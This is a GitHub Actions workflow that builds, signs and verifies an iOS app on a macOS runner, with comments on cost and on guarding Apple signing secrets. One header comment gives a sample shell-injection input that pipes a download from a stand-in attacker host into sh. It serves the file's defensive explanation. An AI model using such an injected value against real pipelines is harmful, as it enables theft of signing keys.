# Buergys Builds - macOS executor workflow.
#
# Belongs in the APP repository as .github/workflows/burgys-ios-build.yml.
# NOT installed by Buergys Builds: adding it to a repository is Sebastian's
# call (master brief, section 29), and the first real run needs his approval.
#
# ---------------------------------------------------------------------------
# COST
#   The job uses the `macos-latest` label: a GitHub *standard* runner, free
#   and unlimited on public repositories. Larger runners are charged even on
#   public repositories.
#   Buergys Builds refuses any label that is not on its allowlist
#   (bb/costguard.py::STANDARD_MACOS_RUNNERS), and a test asserts that this
#   file's runs-on stays on that list - so do not "just try" another label.
#
# SECURITY
#   This repository is PUBLIC and this workflow can reach Apple signing
#   secrets. Two rules follow from that:
#
#   1. No `${{ ... }}` expression is ever written into a `run:` script.
#      Everything arrives through `env:` and is read as "$VARIABLE". An
#      expression pasted into a shell line is substituted *before* bash sees
#      it, so an input like  x"; curl attacker|sh; #  would execute - and
#      this job holds the .p12 and its password.
#
#   2. The job runs in the `ios-signing` environment. Configure that
#      environment with required reviewers, and store the signing secrets on
#      the environment rather than the repository. That makes a human
#      approval mandatory before any run can touch the signing identity.
#
#   There is deliberately no `pull_request` or `pull_request_target` trigger:
#   a pull request - from a fork or otherwise - must never be able to reach
#   these secrets.
# ---------------------------------------------------------------------------
name: Buergys Builds - iOS
run-name: ${{ inputs.build_id }} ${{ inputs.scheme }} ${{ inputs.mode }}

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: Buergys Builds Build-ID (BB-YYYYMMDD-CODE-NNN)
        required: true
      commit:
        description: Commit, den Buergys Builds geprueft hat
        required: true
      mode:
        description: AD_HOC oder APP_STORE_RELEASE
        required: true
        default: AD_HOC
      scheme:
        required: true
      build_number:
        required: true
      marketing_version:
        required: true
      profile_name:
        required: true

permissions:
  contents: read

jobs:
  build:
    # Standard runner. Free on public repositories. Do not change.
    runs-on: macos-latest
    # Protected environment: put the signing secrets here and require a
    # reviewer, so no dispatch can reach them unattended.
    environment: ios-signing
    timeout-minutes: 30
    env:
      # Every input crosses into the shell through the environment, never
      # through string interpolation.
      BB_BUILD_ID: ${{ inputs.build_id }}
      BB_COMMIT: ${{ inputs.commit }}
      BB_MODE: ${{ inputs.mode }}
      BB_SCHEME: ${{ inputs.scheme }}
      BB_BUILD_NUMBER: ${{ inputs.build_number }}
      BB_MARKETING_VERSION: ${{ inputs.marketing_version }}
      BB_PROFILE_NAME: ${{ inputs.profile_name }}
      BB_TEAM_ID: ${{ vars.BURGYS_TEAM_ID }}
      BB_BUNDLE_ID: ${{ vars.BURGYS_BUNDLE_ID }}
    steps:
      - name: Validate the inputs before anything else touches them
        run: |
          set -euo pipefail
          # Buergys Builds validates all of this on Windows too. Repeating it
          # here means a hand-started run cannot smuggle anything in either.
          printf '%s' "$BB_BUILD_ID"  | grep -Eq '^BB-[0-9]{8}-[A-Z0-9]{2,6}-[0-9]{3,}$'
          printf '%s' "$BB_COMMIT"    | grep -Eq '^[0-9a-f]{7,40}$'
          printf '%s' "$BB_MODE"      | grep -Eq '^(AD_HOC|APP_STORE_RELEASE)$'
          printf '%s' "$BB_SCHEME"    | grep -Eq '^[A-Za-z][A-Za-z0-9_-]{0,63}$'
          printf '%s' "$BB_BUILD_NUMBER"      | grep -Eq '^[0-9]{1,9}$'
          printf '%s' "$BB_MARKETING_VERSION" | grep -Eq '^[0-9]+(\.[0-9]+){0,2}$'
          printf '%s' "$BB_BUNDLE_ID" | grep -Eq '^[A-Za-z0-9.-]{1,155}$'
          printf '%s' "$BB_TEAM_ID"   | grep -Eq '^[A-Z0-9]{10}$'
          # The profile name is free-form Apple text, so it is only ever used
          # as a plist value and as an argv element, never in a shell string.
          printf '%s' "$BB_PROFILE_NAME" | grep -Eq '^[A-Za-z0-9 ._-]{1,128}$'

      - name: Checkout the exact commit Windows verified
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.commit }}
          persist-credentials: false

      # Windows already ran preflight. This is the cheap second opinion, not
      # a replacement for it.
      - name: Preflight
        run: npm run check

      - name: XcodeGen
        run: |
          set -euo pipefail
          brew install xcodegen
          xcodegen generate

      - name: Use the build number Buergys Builds allocated
        run: |
          set -euo pipefail
          PBXPROJ="$BB_SCHEME.xcodeproj/project.pbxproj"
          test -f "$PBXPROJ"
          sed -i '' "s/CURRENT_PROJECT_VERSION = [0-9]*;/CURRENT_PROJECT_VERSION = $BB_BUILD_NUMBER;/g" "$PBXPROJ"
          grep -c "CURRENT_PROJECT_VERSION = $BB_BUILD_NUMBER;" "$PBXPROJ"

      # Signing material comes from the environment's secrets, never from
      # Buergys Builds and never from this file.
      - name: Import signing material
        env:
          CERT_P12_BASE64: ${{ secrets.BURGYS_CERT_P12_BASE64 }}
          CERT_PASSWORD: ${{ secrets.BURGYS_CERT_PASSWORD }}
          PROFILE_BASE64: ${{ secrets.BURGYS_PROFILE_BASE64 }}
        run: |
          set -euo pipefail
          KEYCHAIN="$RUNNER_TEMP/burgys.keychain-db"
          KEYCHAIN_PASSWORD="$(uuidgen)"
          security create-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          security set-keychain-settings -lut 1800 "$KEYCHAIN"
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          printf '%s' "$CERT_P12_BASE64" | base64 --decode > "$RUNNER_TEMP/cert.p12"
          security import "$RUNNER_TEMP/cert.p12" -k "$KEYCHAIN" -P "$CERT_PASSWORD" \
            -T /usr/bin/codesign -T /usr/bin/security
          security set-key-partition-list -S apple-tool:,apple: -s -k "$KEYCHAIN_PASSWORD" "$KEYCHAIN" >/dev/null
          security list-keychains -d user -s "$KEYCHAIN" $(security list-keychains -d user | tr -d '"')
          mkdir -p ~/Library/MobileDevice/Provisioning\ Profiles
          printf '%s' "$PROFILE_BASE64" | base64 --decode \
            > ~/Library/MobileDevice/Provisioning\ Profiles/burgys.mobileprovision
          rm -f "$RUNNER_TEMP/cert.p12"

      - name: Archive and export
        run: |
          set -euo pipefail
          # Export method names: Xcode 15.3 deprecated "ad-hoc"/"app-store" in
          # favour of "release-testing"/"app-store-connect". Both are still
          # accepted at the time of writing; BURGYS_EXPORT_METHOD_ADHOC lets
          # this be switched without editing the workflow if a future Xcode
          # drops the old spelling. See docs/MAC_EXECUTOR.md.
          if [ "$BB_MODE" = "AD_HOC" ]; then
            METHOD="${BURGYS_EXPORT_METHOD_ADHOC:-ad-hoc}"
          else
            METHOD="${BURGYS_EXPORT_METHOD_STORE:-app-store}"
          fi
          # The plist is built with plutil from argv values, so a profile name
          # containing quotes or angle brackets cannot break out of the XML.
          PLIST="$RUNNER_TEMP/ExportOptions.plist"
          /usr/libexec/PlistBuddy -c "Clear dict" -c "Add :method string $METHOD" "$PLIST" 2>/dev/null \
            || printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict/></plist>\n' > "$PLIST"
          /usr/libexec/PlistBuddy \
            -c "Delete :method" -c "Add :method string $METHOD" \
            -c "Add :teamID string $BB_TEAM_ID" \
            -c "Add :signingStyle string manual" \
            -c "Add :compileBitcode bool false" \
            -c "Add :stripSwiftSymbols bool true" \
            -c "Add :provisioningProfiles dict" \
            "$PLIST" >/dev/null 2>&1 || true
          /usr/libexec/PlistBuddy \
            -c "Add :provisioningProfiles:$BB_BUNDLE_ID string $BB_PROFILE_NAME" \
            "$PLIST"
          /usr/libexec/PlistBuddy -c "Print" "$PLIST"
          xcodebuild -project "$BB_SCHEME.xcodeproj" -scheme "$BB_SCHEME" \
            -configuration Release -archivePath "$RUNNER_TEMP/app.xcarchive" \
            -destination 'generic/platform=iOS' archive
          xcodebuild -exportArchive -archivePath "$RUNNER_TEMP/app.xcarchive" \
            -exportOptionsPlist "$PLIST" -exportPath "$RUNNER_TEMP/export"

      # Buergys Builds re-checks all of this on Windows too. Failing here just
      # saves a download.
      - name: Verify the export
        run: |
          set -euo pipefail
          IPA="$(find "$RUNNER_TEMP/export" -maxdepth 1 -name '*.ipa' | head -n 1)"
          test -n "$IPA"
          WORK="$(mktemp -d)"; unzip -q "$IPA" -d "$WORK"
          APP="$(find "$WORK/Payload" -maxdepth 1 -name '*.app' | head -n 1)"
          test -n "$APP"
          test "$(/usr/libexec/PlistBuddy -c 'Print :CFBundleVersion' "$APP/Info.plist")" = "$BB_BUILD_NUMBER"
          test "$(/usr/libexec/PlistBuddy -c 'Print :CFBundleShortVersionString' "$APP/Info.plist")" = "$BB_MARKETING_VERSION"
          test "$(/usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$APP/Info.plist")" = "$BB_BUNDLE_ID"
          test -f "$APP/web/index.html"
          codesign --verify --deep --strict "$APP"
          if [ "$BB_MODE" = "AD_HOC" ]; then
            security cms -D -i "$APP/embedded.mobileprovision" > "$WORK/p.plist"
            # An ad-hoc profile MUST list devices, otherwise it is the wrong one.
            /usr/libexec/PlistBuddy -c 'Print :ProvisionedDevices' "$WORK/p.plist" > /dev/null
          fi
          mkdir -p artifact
          cp "$IPA" "artifact/$BB_BUILD_ID.ipa"
          shasum -a 256 "artifact/$BB_BUILD_ID.ipa" | tee "artifact/$BB_BUILD_ID.sha256"

      - name: Upload the IPA for Buergys Builds to collect
        uses: actions/upload-artifact@v4
        with:
          name: ${{ inputs.build_id }}
          path: artifact/
          retention-days: 7

      - name: Clean up the keychain
        if: always()
        run: |
          security delete-keychain "$RUNNER_TEMP/burgys.keychain-db" 2>/dev/null || true
          rm -f ~/Library/MobileDevice/Provisioning\ Profiles/burgys.mobileprovision
